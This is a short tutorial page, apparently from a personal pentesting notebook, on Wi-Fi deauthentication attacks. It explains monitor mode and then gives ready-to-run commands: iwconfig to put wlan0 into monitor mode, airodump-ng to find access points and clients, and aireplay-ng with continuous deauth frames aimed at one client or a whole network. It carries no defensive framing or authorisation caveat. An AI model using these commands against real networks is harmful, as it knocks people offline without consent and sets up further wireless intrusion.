---
description: >-
  A Wi-Fi deauthentication attack is a type of denial-of-service attack that
  targets communication between a user and a Wi-Fi wireless access point.
---

# Deauth

{% hint style="warning" %}
You will need a wifi adapter that allows monitor mode
{% endhint %}

&#x20;_ **Monitor mode** allows a computer with a wireless network interface controller (WNIC) to monitor all traffic received on a wireless channel. Unlike promiscuous mode, which is also used for packet sniffing, monitor mode allows packets to be captured without having to associate with an access point or ad hoc network first. Monitor mode only applies to wireless networks, while promiscuous mode can be used on both wired and wireless networks._

## Monitor mode

{% hint style="warning" %}
run _<mark style="color:blue;">`ifconfig`</mark>_ to check the name of your network adapter, in my case it is wlan0
{% endhint %}

{% code lineNumbers="true" %}
```
# turn down the network adapter
iwconfig wlan0 down

# Changing into monitor mode
iwconfig wlan0 mode monitor

# turn up the network adapter
iwconfig wlan0 up

## run iwconfig to check if monitor mode is successfully enabled 
```
{% endcode %}

## Packet Capture

{% code lineNumbers="true" %}
```
# for all network 
airodump-ng wlan0 

# for a specified network
airodump-ng wlan0 --bssid [MAC]

```
{% endcode %}

{% hint style="info" %}
BSSID - MAC Address of an Access Point

Station - MAC Address of a Client&#x20;
{% endhint %}

## Deauth

{% code lineNumbers="true" %}
```
# on single client
aireplay-ng --deauth 0 -a [bssid] -c [station] wlan0

# on whole network
aireplay-ng --deauth 0 -a [bssid] wlan0
```
{% endcode %}
